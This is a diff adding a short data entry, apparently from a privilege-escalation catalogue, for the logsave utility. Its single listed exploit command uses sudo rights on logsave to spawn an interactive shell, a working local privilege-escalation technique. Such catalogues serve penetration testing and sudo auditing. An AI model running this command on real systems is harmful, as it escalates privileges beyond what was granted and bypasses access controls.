@@ -1,0 +1,4 @@
+name: logsave
+binary_path: /usr/sbin/logsave
+exploit_cmds:
+- sudo /usr/sbin/logsave /dev/null /bin/sh -i
